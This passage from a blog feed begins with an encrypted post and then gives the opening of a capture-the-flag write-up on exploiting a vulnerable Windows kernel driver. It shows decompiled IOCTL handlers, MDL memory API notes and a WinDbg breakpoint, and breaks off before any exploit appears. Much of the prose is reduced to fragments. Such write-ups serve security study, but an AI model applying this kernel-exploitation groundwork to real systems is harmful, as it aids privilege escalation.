2735702e377d8181d3207d7185de3e732b5133434a57131bcc42b936ce22f03399acdefeb36b580fb51b14cef2dd22ffb1d5673f1bf0df167fa962e7a86d4749723439cfa9ad40c2bf728dacc7b21d9f17ac422a3a8f3459edc5b097987cf0b905856e58feeb0ce274be53735a1db6a0389f084e2c44f97936400362c1642195ea664d86ee3525b377f24b0ff096c31d3b015d6a24b382b1148d3de7de33d4f8db51c8c35e6739df885c9803acb38485502e5ee81518f0101c247c48bef08888faadfad8465d1db19f345a35ff52eef9d7729f7fd1ef031a0a8234c669fc31ab481fcdf54bd63f19183a94b177f14abbd7e09af523f914729f529814ccc8c6130642e07082532f679671774b6c1c76439acf984832b25ac310af510e9e0b7162d6baaf177d3c336c667be2b3a577a2e19775d855bd8145d6da5b68d680712fdf29196e250fdd9ecdb049d41c9fec563b58d5c569fafe8714f08a78e0a5b90f7afdf3d79c6e8a9feb134ed4a41dea542fb562fdd477eb9f29d5e4db92cacb11058b338127b6c00cdedfb7516ca7557bf8e41fd5d60</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">eleet! 1337!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AliyunCTF SYSTEM</title>
      <link href="/2024/04/25/AliyunCTF-SYSTEM/"/>
      <url>/2024/04/25/AliyunCTF-SYSTEM/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Windows Driver Exploit</p></blockquote><span id="more"></span><p></p><h2 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h2><p></p><p>DriverEntryWindows <code>_security_cookie</code>DriverObject</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_14000610C</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Init</span>(DriverObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DriverObject</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __fastcall <span class="title">Init</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// ebx</span></span><br><span class="line">  _OWORD *DeviceExtension; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DeviceName; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DestinationString; <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line">  PDEVICE_OBJECT DeviceObject; <span class="comment">// [rsp+80h] [rbp+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DeviceObject = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\SIOCTL&quot;</span>);</span><br><span class="line">  result = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x30</span>u, &amp;DeviceName, <span class="number">0x22</span>u, <span class="number">0x100</span>u, <span class="number">0</span>, &amp;DeviceObject);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">0</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">2</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)DispatchControl;</span><br><span class="line">    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DestinationString, <span class="string">L&quot;\\DosDevices\\IoctlTest&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DestinationString, &amp;DeviceName);</span><br><span class="line">    DeviceExtension = DeviceObject-&gt;DeviceExtension;</span><br><span class="line">    *DeviceExtension = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _mm_lfence();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DispatchCommon</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                     0x00 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                      0x02 </span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCommon</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  a2-&gt;IoStatus.Status = <span class="number">0</span>;</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sizesize0x1000</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, IRP *irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  PVOID DeviceExtension; <span class="comment">// rdi</span></span><br><span class="line">  ULONG ulInputBufferLength; <span class="comment">// r8d</span></span><br><span class="line">  ULONG ulOutputBufferLength; <span class="comment">// edx</span></span><br><span class="line">  ULONG ulIoControlCode; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *__pStartAddr2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *__pVirtualAddress; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *buffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID ContiguousMemory; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *_pVirtualAddress; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *Mdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *_pMdl; <span class="comment">// r14</span></span><br><span class="line">  PVOID pStartAddr2; <span class="comment">// rax</span></span><br><span class="line">  PVOID _pStartAddr2; <span class="comment">// r12</span></span><br><span class="line">  _DWORD *SystemBuffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID pVirtualAddress; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *pMdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> pMapAddr; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _pMapAddr; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = irp-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  DeviceExtension = pDeviceObject-&gt;DeviceExtension;</span><br><span class="line">  ulInputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">  ulOutputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">  <span class="keyword">if</span> ( !ulInputBufferLength || !ulOutputBufferLength )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0xC000000D</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  ulIoControlCode = CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">  <span class="keyword">switch</span> ( ulIoControlCode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402400</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      SystemBuffer = irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      usSize = (*SystemBuffer + <span class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      pVirtualAddress = <span class="built_in">MmAllocateContiguousMemory</span>(usSize, (PHYSICAL_ADDRESS)<span class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = pVirtualAddress;</span><br><span class="line">      <span class="keyword">if</span> ( pVirtualAddress )</span><br><span class="line">      &#123;</span><br><span class="line">        pMdl = <span class="built_in">IoAllocateMdl</span>(pVirtualAddress, usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);/</span><br><span class="line">        _pMdl = pMdl;</span><br><span class="line">        <span class="keyword">if</span> ( pMdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(pMdl); </span><br><span class="line">          pMapAddr = (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pMapAddr = pMapAddr;</span><br><span class="line">          <span class="keyword">if</span> ( pMapAddr )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_QWORD *)DeviceExtension = pMapAddr;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">1</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">2</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(<span class="type">void</span> *)pMapAddr, <span class="number">0xFF</span>, usSize);</span><br><span class="line">            *SystemBuffer = usSize;             </span><br><span class="line">            SystemBuffer[<span class="number">1</span>] = _pMapAddr;        </span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">8</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">          <span class="built_in">IoFreeMdl</span>(_pMdl);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>(_pVirtualAddress);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402404</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      buffer = (<span class="type">char</span> *)irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      _usSize = (*(_DWORD *)buffer + <span class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      ContiguousMemory = <span class="built_in">MmAllocateContiguousMemory</span>(_usSize, (PHYSICAL_ADDRESS)<span class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = ContiguousMemory;</span><br><span class="line">      <span class="keyword">if</span> ( ContiguousMemory )</span><br><span class="line">      &#123;</span><br><span class="line">        Mdl = <span class="built_in">IoAllocateMdl</span>(ContiguousMemory, _usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">        _pMdl = Mdl;</span><br><span class="line">        <span class="keyword">if</span> ( Mdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(Mdl);</span><br><span class="line">          pStartAddr2 = <span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pStartAddr2 = pStartAddr2;</span><br><span class="line">          <span class="keyword">if</span> ( pStartAddr2 )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">4</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">3</span>) = pStartAddr2;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">5</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(pStartAddr2, <span class="number">0xFF</span>, _usSize);</span><br><span class="line">            *(_DWORD *)buffer = _usSize;</span><br><span class="line">            *(_QWORD *)(buffer + <span class="number">4</span>) = _pStartAddr2;</span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">12</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402408</span>:</span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)DeviceExtension )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl || !*((_QWORD *)DeviceExtension + <span class="number">1</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(*(PVOID *)DeviceExtension, __pMdl);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL *)DeviceExtension + <span class="number">2</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C40240C</span>:</span><br><span class="line">      __pStartAddr2 = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pStartAddr2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl2 = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">5</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl2 || !*((_QWORD *)DeviceExtension + <span class="number">4</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(__pStartAddr2, __pMdl2);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL *)DeviceExtension + <span class="number">5</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">4</span>);</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">MmFreeContiguousMemory</span>(__pVirtualAddress);</span><br><span class="line">LABEL_17:</span><br><span class="line">      irp-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0xC0000010</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">  irp-&gt;IoStatus.Status = v3;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(irp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MDL"><a href="#MDL" class="headerlink" title="MDL"></a>MDL</h3><p>memory descriptor list</p><p> I&#x2F;O  <em></em>(MDL) </p><ul><li>StartVapage</li><li>ByteOffsetpage</li><li>ByteCount: </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_MDL</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span>      *Next;</span><br><span class="line">  CSHORT           Size;</span><br><span class="line">  CSHORT           MdlFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EPROCESS</span> *Process;</span><br><span class="line">  PVOID            MappedSystemVa;</span><br><span class="line">  PVOID            StartVa;</span><br><span class="line">  ULONG            ByteCount;</span><br><span class="line">  ULONG            ByteOffset;</span><br><span class="line">&#125; MDL, *PMDL;</span><br></pre></td></tr></table></figure><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p><strong>MmAllocateContiguousMemory</strong>NonPagedPool</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function">PVOID <span class="title">MmAllocateContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T           NumberOfBytes,           <span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PHYSICAL_ADDRESS HighestAcceptableAddress <span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>MmAllocateContiguousMemoryXxx</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmFreeContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID BaseAddress</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>IoAllocateMdl</strong> (MDL) NonPagedPool</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  MDL </span></span><br><span class="line"><span class="function">PMDL <span class="title">IoAllocateMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      __drv_aliasesMem PVOID VirtualAddress,   <span class="comment">//  MDL </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                ULONG                  Length,           <span class="comment">//  MDL </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                SecondaryBuffer,  <span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                ChargeQuota,      <span class="comment">//  **FALSE**</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] PIRP                   Irp               <span class="comment">//  MDL  IRP </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ntoskrnl.exe</span></span><br><span class="line">result = (PMDL)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, size, <span class="string">&#x27; ldM&#x27;</span>);</span><br></pre></td></tr></table></figure><p>MDLVurtualAddress</p><p><strong>IoFreeMdl</strong> (MDL) </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoFreeMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMDL Mdl</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>MmBuildMdlForNonPagedPool</strong> MDL</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmBuildMdlForNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] PMDL MemoryDescriptorList    <span class="comment">//  MDL </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>MmMapLockedPagesSpecifyCache</strong> MDL </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">MmMapLockedPagesSpecifyCache</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PMDL                                                                          MemoryDescriptorList,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictType(KPROCESSOR_MODE / <span class="keyword">enum</span> _MODE,__drv_typeConst)KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictTypeMatch(__drv_typeCond)MEMORY_CACHING_TYPE                      CacheType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID                                                                         RequestedAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         BugCheckOnFailure,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         Priority</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>AccessMode<strong>KernelMode</strong><strong>UserMode</strong> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_MODE</span> &#123; </span><br><span class="line">    KernelMode, </span><br><span class="line">    UserMode, </span><br><span class="line">    MaximumMode </span><br><span class="line">&#125; MODE; </span><br></pre></td></tr></table></figure><p><code>MmNonCached</code></p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>NonPagedPoolFree0free</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m s*</span><br><span class="line">Browse full <span class="keyword">module</span> list</span><br><span class="line"><span class="comment">// startPE</span></span><br><span class="line">start             end                 <span class="keyword">module</span> name</span><br><span class="line">fffff805`<span class="number">1b</span>010000 fffff805`<span class="number">1b</span>019000   <span class="built_in">sioctl</span>     (no symbols)</span><br><span class="line"><span class="comment">// IDA: 140005020 </span></span><br><span class="line"><span class="comment">// 0x5020 </span></span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 sioctl+<span class="number">0x5020</span>  <span 